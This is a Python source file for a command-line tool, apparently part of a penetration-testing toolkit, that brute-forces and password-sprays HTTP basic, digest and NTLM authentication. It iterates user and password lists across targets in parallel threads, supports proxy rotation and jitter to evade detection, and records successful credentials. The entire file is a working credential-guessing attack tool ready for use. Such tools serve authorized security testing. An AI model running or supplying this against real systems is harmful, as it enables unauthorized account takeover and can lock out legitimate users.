#!/usr/bin/env python3
# Author: @m8sec
# License: BSD 3-Clause
#
# Description:
# HTTP brute force tool, using python requests under the hood, to simplify the process
# of brute forcing sites with the "Authorization" HTTP request header.
#
# This will NOT add POST data to the request or check anything but HTTP response status codes for valid results.
#
# Usage:
# httpauth.py -u users.txt -p Password123 -a ntlm https://example.com/ad_connect/login.aspx
import argparse
import threading
from time import sleep
from sys import argv, exit
from ipparser import ipparser
from datetime import datetime
from urllib3 import disable_warnings, exceptions

from taser import BANNER
from taser.http import web_request, auth_handler
from taser.utils import file_exists, get_timestamp, val2list
from taser.logx import setup_file_logger, setup_cli_logger, highlight

disable_warnings(exceptions.InsecureRequestWarning)


def worker(context):
    code = 0
    try:
        a = auth_handler(context.user, context.password, auth_type=context.auth_type)
        r = web_request(context.target, method=context.method, timeout=context.timeout, proxies=context.proxy, auth=a)
        code = r.status_code
        size = len(r.text)
    except Exception as e:
        pass
    if code not in [0,401]:
        cliLogger.success("{:<35} {:<30} {:<24} (Code: {} | Size: {})".format(context.user, context.password, highlight('Success', fg='green'), code, size))
    elif context.verbose:
        cliLogger.fail("{:<35} {:<30} {:<24} (Code: {} | Size: {}))".format(context.user, context.password, highlight('Failed', fg='red'), code, size))
    fileLogger.info("{}\t{}\t{}\t{}\t{}".format(get_timestamp(), context.target, code, context.user, context.password))
    sleep(context.jitter)


def main(args):
    cliLogger.info("Users: {}".format(len(args.username)))
    cliLogger.info("Pass : {}".format(len(args.password)))
    cliLogger.info("Auth: {} ({})".format(args.auth.upper(), args.method.upper()))
    cliLogger.info("Host(s): {}".format(args.target[0] if len(args.target) == 1 else len(args.target)))
    cliLogger.info("Time : {}\n".format(datetime.now().strftime('%m-%d-%Y %H:%M:%S')))
    if input("[*] Do you want to continue (Y/n)? ") in ['n', 'N']:
        return

    for t in args.target:
        cliLogger.status(t)
        for user in args.username:
            for pwd in args.password:
                context = argparse.Namespace(target = t,
                                            method = args.method,
                                            user = "{}\\{}".format(args.domain, user) if args.domain else user,
                                            password = pwd,
                                            auth_type = args.auth,
                                            timeout = args.timeout,
                                            proxy = args.proxy,
                                            jitter = args.jitter,
                                            verbose = args.verbose)
                x = threading.Thread(target=(worker), args=(context,),)
                x.daemon = True
                x.start()
        while threading.active_count() >= args.max_threads:
            sleep(0.05)
    while threading.active_count() > 1:
        sleep(0.05)


if __name__ == '__main__':
    args = argparse.ArgumentParser(description="\t\t{0}".format(argv[0]), formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)
    args.add_argument('-o', dest='outfile', action='store', help='Filename to write results (optional)')
    args.add_argument('-d', dest='domain', type=str, default=False, help='Domain Suffix')
    args.add_argument('-m', dest='method', choices=['GET', 'POST'], default='GET', help='HTTP request method')
    args.add_argument('-a', dest='auth', choices=['ntlm', 'basic', 'digest'], default='basic', help='HTTP Auth method')
    args.add_argument('-j', dest='jitter', type=int, default=0, help='Seconds to sleep until thread is released (0*)')
    args.add_argument('-T', dest='max_threads', type=int, default=5, help='Max threads (5*)')
    args.add_argument('-t', dest='timeout', type=int, default=5, help='Connection timeout (5*)')
    args.add_argument('-v', dest='verbose', action='store_true', help='Verbose')

    auth = args.add_argument_group("Authentication Options")
    auth.add_argument('-u', dest='username', default=False, type=lambda x: val2list(args, x), help='Username(s) or Email(s)')
    auth.add_argument('-p', dest='password', default=False, type=lambda x: val2list(args, x),help='Password(s) to spray)')

    proxy = args.add_mutually_exclusive_group(required=False)
    proxy.add_argument('--proxy', dest='proxy', action='append', default=[], help='Proxy requests (IP:Port)')
    proxy.add_argument('--proxy-file', dest='proxy', default=False, type=lambda x: file_exists(args, x), help='Load proxies from file for rotation')

    args.add_argument(dest='target', nargs='+', help='Target Host/DNS Name')
    args = args.parse_args()
    args.target = ipparser(args.target[0])

    cliLogger = setup_cli_logger(spacer=[4, 40, 30, ])
    fileLogger = setup_file_logger(args.outfile, mode='w')
    cliLogger.info(BANNER)

    try:
        main(args)
    except KeyboardInterrupt:
        print('[!] Keyboard interrupt detected, closing...')
        exit(1)
